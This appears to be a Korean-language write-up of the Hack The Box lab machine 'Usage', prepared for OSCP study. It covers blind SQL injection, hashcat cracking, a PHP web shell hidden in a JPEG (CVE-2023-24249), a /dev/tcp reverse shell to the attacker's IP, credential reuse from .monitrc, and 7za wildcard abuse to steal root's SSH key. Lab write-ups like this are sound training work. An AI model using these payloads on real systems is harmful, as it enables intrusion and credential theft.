---
slug: "usage"
title: "usage"
date: 2026-07-06
category: "리눅스"
section: "OSCP"
tags: []
excerpt: "gobuster 결과 robots.txt가 열려 있다는걸 확인할 수 있고 ~~~ User-agent: * Disallow: ~~~ 다음과 같은 내용이 있음 -> 크롤링을 차단하는…"
readingTime: 12
---

#### Box: usage | Linux | Easy
날짜:
소요시간:

##### Open Ports
22
80
##### Interesting Services
```shell
#80포트 host파일에 등록
echo "10.129.22.253 usage.htb" | sudo tee -a /etc/hosts

# vhost도 있는거 같아서 얘도 등록
echo "10.129.22.253 admin.usage.htb" | sudo tee -a /etc/hosts
```

gobuster 결과 robots.txt가 열려 있다는걸 확인할 수 있고 
~~~
User-agent: *
Disallow:
~~~
다음과 같은 내용이 있음 -> 크롤링을 차단하는 사이트가 없다는 뜻

burpsuite를 보면 로그인 시에
```
POST /post-login HTTP/1.1
Host: usage.htb
Content-Length: 93
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://usage.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://usage.htb/login
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6InBiTWhOWkErVlpkR242WDV0TUw2NkE9PSIsInZhbHVlIjoiQjZYS0FRM0Q2RFBqaDY2QUl4aVc1VENpdnZUemRRQUxSNGNRaGxRTncraFVySDlRaytLaWkrQzZEbDBZMW5SUjg4NVNkRzBqQ1NTbFllaTBTS2IrUTZTZ0JiL29CVmVLbU85dFpRZUlaclRVWE9vQ0ZoWDFIZDVxekJsWW5QMWMiLCJtYWMiOiJkMzdiZmZiMDlkYmVmZDBiMTRkNTBkMDgxOWEyNDgwOTYzOWNkZDQ1ZTNmODQ1NWEwYzVlNTJjODdmOTJhMjA0IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlNKaG12S2NBaGJvcEx3NnYvRWxuZFE9PSIsInZhbHVlIjoiMlY2U25HdVI0eHk2UDA0Y3dNTzZZRzZCNjJDNDZkMjdialBjR2xYUGVWbi92NTFJSG05WlQ3OExjWm05ZzJyQ3dvMDVhL0FyM2hRaXczQytSSkFOUnpuRFJmTEExbXlHVHJuc3VEL1hxZGRUVWpBRXR1VldMTEU0SUo5MzN4cUoiLCJtYWMiOiI2YmNjYTFhOTQyMDg2NTQ2OGZmN2RlODdhZDgxMTZlZjYwMzY2YzExNDAyOGM3NTNmM2I5YjhhOGQ5ZjAxNWU4IiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=N35yN3NyK6q08MB3NX3FVgzu94uhIOIwuNQYBii4&email=kenny0428%40naver.com&password=dfsafsda
```
-> 잘 모르겠음


##### Initial Foothold
벡터: Blind SQLi → Admin 패널 로그인 → 파일 업로드 RCE (CVE-2023-24249)
명령어:

/reset-password 보면 이런거도 됨
```
# ' or 1=1 -- -
We have e-mailed your password reset link to ' or 1=1 -- -
# ' or 1=2 -- -
Email address does not match in our records!
```
-> blind sqli 같음
일단 db 이름부터 하나씩 뽑아와보자
그냥 코드 하나 짰음 [[Blind sqli script]]

**db이름**: usage_blog
**테이블 구조**: admin_users
**컬럼**: id,username,password
**데이터**: admin | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2

```shell
hashcat -m 3200 -a 0 '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' /usr/share/wordlists/rockyou.txt
```
-> whatever1
-> 로그인 성공

setting들어가보니까 이미지를 넣을 수 있음 php 파일을 넣어보려 함
```
printf '\xff\xd8\xff' > exploit.php.jpg

echo '<?php system($_GET["cmd"]); ?>' >> exploit.php.jpg
```
-> 이거까지 넣어지고 
[CVE-2023-24249](https://github.com/ldb33/CVE-2023-24249-PoC/blob/main/CVE-2023-24249.py#L23)
여기 보면 submit 보내면서 프록시로 파일이름이랑 내용만 바꾸면 파일이 .php로 업로드 된다고 함

업로드 하고나서 보면 이게 페이지가 일정 시간이 지나면 자기 혼자 원본 사진으로 롤백 하려는 성질이 있는것 같아서, 프록시로 묶어둠 
-> (여기서 중요한 정보가 파일이 `/uploads/images/test.php`이 경로에 있다고 프록시에서 잡힘)

그래서 http://admin.usage.htb/uploads/images/test.php?cmd=id 이렇게 해보니까 성공해서 리버스 쉘 작동 ㄱㄱ
자꾸 실패하니까 재빨리 해야 함
```sh
#칼리에서
nc -lvnp 5555

#웹에서
http://admin.usage.htb/uploads/images/test.php?cmd=/bin/bash+-c+%27/bin/bash+-i+%3E%26+/dev/tcp/10.10.15.242/5555+0%3E%261%27
```
**user.txt:** 9b945664db492334bf1a1e1cf26ec1a1


##### Privilege Escalation (dash->xander->root)
벡터:
1. dash→xander: .monitrc 크레덴셜 재사용 (패스워드 스프레이)
2. xander→root: sudo usage_management → 7za 와일드카드 + @listfile 트릭으로 /root/.ssh/id_rsa 탈취 → SSH 루트 접속
명령어:
ssh로 들어와서 
~~~sh
# 웹쉘에서 실행 (타겟)
mkdir -p ~/.ssh
echo "ssh-ed25519 공개키..." > ~/.ssh/authorized_keys

# 칼리에서
ssh -i ~/.ssh/id_ed25519 유저@IP
~~~
-> 여긴 너무 아무 정보가 없음

~~~
dash@usage:~$ cat .monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd
~~~
 -> 크레덴셜이 있음
root는 아닌 듯하고 home에 계정 하나 더 있길래 여길 이 크레덴셜로 접속
```sh
ssh xander@10.129.23.128
```
이후 `sudo -l` 실행해보니 /usr/bin/usage_management 다음과 같은 명령이 실행 가능하다고 함
~~~sh
sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
~~~

```sh
strings /usr/bin/usage_management

# /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
7za를 활용해서 /var/backups/project.zip이라는 파일로 압축하는데 -tzip
-t{Type} : Set type of archive
-snl : store symbolic links as links
-mmt[N] : set number of CPU threads

-> backup인거 보니까 1번 명령인듯 함
```
여기에 **와일드 카드**가 있는 명령어가 있음
https://hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html -> 이사이트에 관련된 지식들이 많음 ㅎㅎㅎㅎ

```sh
#7za가 있는 디렉토리로 이동후
ln -s /root/root.txt root.txt
ls
root.txt


sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7302P 16-Core Processor                (830F10),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54871391

Scanning the drive:
          
WARNING: No more files
6bfda994bb4d0281a497ded3dd25157d

```
**root.txt:** 6bfda994bb4d0281a497ded3dd25157d

**근데 사실 우린 루트의 권한을 얻어야 되는 게임임**
~~~sh
# .ssh/id_rsa 파일에 링크 걸기
echo "/root/.ssh/id_rsa" > @root.txt 
ln -s @root.txt root.txt
sudo /usr/bin/usage_management

#이동해서 unzip
cd /tmp
unzip /var/backups/project.zip

xander@usage:/tmp$ ls
id_rsa

ssh -i id_rsa root@10.129.11.189
#-> 이러면 루트 획득
~~~

##### Rabbit Hole (막혔던 것)
- Blind sqli
- root 권한 .ssh/id_rsa 이용해서 상승
- .monitrc 확인
##### 다음 박스에서 써먹을 것
- `sudo -l` 이후 `strings` 사용
- 와일드 카드 있는지 확인하기
- blindsqli 코드 이용하기
- @listfile 트릭
- 홈 디렉토리 파일 확인 (모든 숨긴 파일)

---
